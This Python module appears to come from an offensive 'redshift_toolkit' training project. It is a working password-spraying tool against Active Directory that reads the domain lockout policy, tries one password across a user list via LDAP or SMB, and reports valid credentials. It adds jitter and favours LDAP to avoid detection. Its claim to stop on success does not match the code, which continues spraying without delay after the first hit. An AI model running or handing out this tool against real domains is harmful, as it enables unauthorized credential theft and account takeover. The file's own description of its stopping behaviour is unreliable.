#!/usr/bin/env python3
"""
redshift_toolkit.ad.password_spray — Lockout-aware password spraying
against an Active Directory domain.

Spraying is the inverse of brute-forcing: try ONE password against MANY
users, with a delay between attempts that stays well under the domain
lockout threshold.

Default behavior is paranoid:
- Read the lockout policy first via LDAP (anonymous if possible).
- Default interval: 2100 seconds (35 minutes) between attempts per user.
- Random jitter (default ±60s) so attempts are not perfectly periodic.
- Stops on success (don't keep hammering once we've found one credential).

Authentication mechanisms supported:
- SMB (most reliable signal)
- LDAP (preferred — many environments don't log LDAP failures as loudly)

Usage
-----
  # Just read the policy
  python3 -m redshift_toolkit.ad.password_spray \\
      --dc dc01.lab.local --read-policy

  # Spray with default safe interval
  python3 -m redshift_toolkit.ad.password_spray \\
      --dc dc01.lab.local --domain lab.local \\
      --userlist users.txt --password 'Welcome2026!'

  # Aggressive spray (override interval; you've coordinated with AD admins)
  python3 -m redshift_toolkit.ad.password_spray \\
      --dc dc01.lab.local --domain lab.local \\
      --userlist users.txt --password 'Spring2026!' \\
      --interval 60 --method ldap

Requires
--------
  pip install ldap3 impacket

Author: Redshift Project — Module 18
License: MIT
"""

from __future__ import annotations

import argparse
import json
import random
import sys
import time
from dataclasses import asdict, dataclass, field

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GREY = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


@dataclass
class SprayResult:
    success: list[dict] = field(default_factory=list)
    failures: list[dict] = field(default_factory=list)
    locked_out: list[str] = field(default_factory=list)
    policy: dict = field(default_factory=dict)


def domain_to_dn(domain: str) -> str:
    return ",".join(f"DC={p}" for p in domain.split("."))


def read_lockout_policy(dc: str, domain: str | None = None,
                         user: str | None = None, password: str | None = None) -> dict:
    """Read domain lockout policy. Anonymous bind preferred."""
    try:
        from ldap3 import ALL, NTLM, Connection, Server
    except ImportError:
        sys.stderr.write("error: pip install ldap3\n")
        sys.exit(2)

    s = Server(dc, get_info=ALL)
    try:
        if user and password and domain:
            c = Connection(s, user=f"{domain}\\{user}", password=password,
                           authentication=NTLM, auto_bind=True)
        else:
            c = Connection(s, auto_bind=True)
    except Exception as e:
        return {"error": str(e)}

    base_dn = ",".join(f"DC={p}" for p in (domain or s.info.naming_contexts[0].split(",")[0].split("=")[1]).split("."))
    c.search(base_dn, "(objectClass=domain)",
             attributes=["lockoutThreshold", "lockoutDuration",
                         "lockoutObservationWindow", "minPwdLength",
                         "pwdHistoryLength"])
    out = {}
    if c.entries:
        e = c.entries[0]
        out["lockout_threshold"] = int(e.lockoutThreshold.value or 0) if e.lockoutThreshold.value else 0
        out["min_password_length"] = int(e.minPwdLength.value or 0) if e.minPwdLength.value else 0
        out["password_history"] = int(e.pwdHistoryLength.value or 0) if e.pwdHistoryLength.value else 0
        # lockoutDuration is in negative 100-ns units
        try:
            ld = int(e.lockoutDuration.value)
            out["lockout_duration_seconds"] = abs(ld) // 10_000_000
        except Exception:
            pass
        try:
            lo = int(e.lockoutObservationWindow.value)
            out["lockout_observation_seconds"] = abs(lo) // 10_000_000
        except Exception:
            pass
    c.unbind()
    return out


def try_ldap(dc: str, domain: str, user: str, password: str) -> tuple[bool, str]:
    """Return (success, reason)."""
    try:
        from ldap3 import NTLM, Connection, Server
        from ldap3.core.exceptions import LDAPBindError
    except ImportError:
        return False, "ldap3 not installed"
    s = Server(dc)
    try:
        c = Connection(s, user=f"{domain}\\{user}", password=password,
                       authentication=NTLM, auto_bind=True)
        c.unbind()
        return True, "ok"
    except LDAPBindError as e:
        msg = str(e).lower()
        if "data 775" in msg:  # account locked out
            return False, "locked"
        if "data 533" in msg:  # disabled
            return False, "disabled"
        if "data 532" in msg:  # password expired
            return True, "expired (valid creds)"
        if "data 701" in msg:  # account expired
            return False, "account expired"
        if "data 52e" in msg:  # invalid credentials
            return False, "invalid"
        return False, msg
    except Exception as e:
        return False, str(e)


def try_smb(dc: str, domain: str, user: str, password: str) -> tuple[bool, str]:
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        return False, "impacket not installed"
    try:
        smb = SMBConnection(dc, dc, sess_port=445, timeout=10)
        smb.login(user, password, domain=domain)
        smb.logoff()
        return True, "ok"
    except Exception as e:
        msg = str(e)
        if "STATUS_LOGON_FAILURE" in msg:
            return False, "invalid"
        if "STATUS_ACCOUNT_LOCKED_OUT" in msg:
            return False, "locked"
        if "STATUS_PASSWORD_EXPIRED" in msg:
            return True, "expired (valid creds)"
        return False, msg


def main():
    p = argparse.ArgumentParser(
        prog="password_spray",
        description="Lockout-aware password spraying.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--dc", required=True)
    p.add_argument("--domain")
    p.add_argument("--userlist", help="File of usernames, one per line")
    p.add_argument("--password", help="Password to spray")
    p.add_argument("--read-policy", action="store_true",
                   help="Just read and print the lockout policy")
    p.add_argument("--method", choices=("ldap", "smb"), default="ldap")
    p.add_argument("--interval", type=int, default=2100,
                   help="Seconds between attempts per user (default 2100 = 35 min)")
    p.add_argument("--jitter", type=int, default=60, help="±jitter seconds")
    p.add_argument("--bind-user", help="Bind as this user to read policy (optional)")
    p.add_argument("--bind-password", help="Bind password (optional)")
    p.add_argument("--format", choices=("text", "json"), default="text")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args()

    on = sys.stdout.isatty() and not args.no_color
    result = SprayResult()

    # Read policy
    policy = read_lockout_policy(args.dc, args.domain, args.bind_user, args.bind_password)
    result.policy = policy

    if args.format == "text":
        print(paint(f"\n[+] Lockout policy for {args.domain or args.dc}:", BOLD, on))
        for k, v in policy.items():
            print(f"    {k:30s} = {v}")

    if args.read_policy:
        if args.format == "json":
            print(json.dumps(asdict(result), indent=2))
        return

    if not (args.userlist and args.password and args.domain):
        sys.stderr.write("--userlist, --password, --domain required for spraying\n")
        sys.exit(2)

    threshold = policy.get("lockout_threshold", 0)
    if threshold and threshold <= 3:
        print(paint(f"[!] Lockout threshold = {threshold}. ABORT — too risky to spray.", RED, on))
        sys.exit(1)

    with open(args.userlist) as f:
        users = [u.strip() for u in f if u.strip() and not u.startswith("#")]

    if args.format == "text":
        print(paint(f"\n[+] Spraying '{args.password}' against {len(users)} user(s) via {args.method.upper()}",
                    YELLOW, on))
        print(f"    Interval: {args.interval}s ± {args.jitter}s\n")

    runner = try_ldap if args.method == "ldap" else try_smb
    found_first = False

    for i, user in enumerate(users):
        ok, reason = runner(args.dc, args.domain, user, args.password)
        if ok:
            result.success.append({"user": user, "password": args.password, "reason": reason})
            if args.format == "text":
                print(paint(f"[!] SUCCESS: {user}:{args.password} ({reason})", GREEN, on))
            if not found_first:
                found_first = True
        elif reason == "locked":
            result.locked_out.append(user)
            if args.format == "text":
                print(paint(f"[~] {user:30s} LOCKED — STOPPING", RED, on))
            break
        else:
            result.failures.append({"user": user, "reason": reason})
            if args.format == "text":
                print(f"    {user:30s} {reason}")

        if i < len(users) - 1 and not found_first:
            sleep_s = args.interval + random.randint(-args.jitter, args.jitter)
            sleep_s = max(1, sleep_s)
            time.sleep(sleep_s)

    if args.format == "json":
        print(json.dumps(asdict(result), indent=2))
    else:
        print(paint(f"\n[+] Success: {len(result.success)}  "
                    f"Failed: {len(result.failures)}  "
                    f"Locked: {len(result.locked_out)}", BOLD, on))


if __name__ == "__main__":
    main()
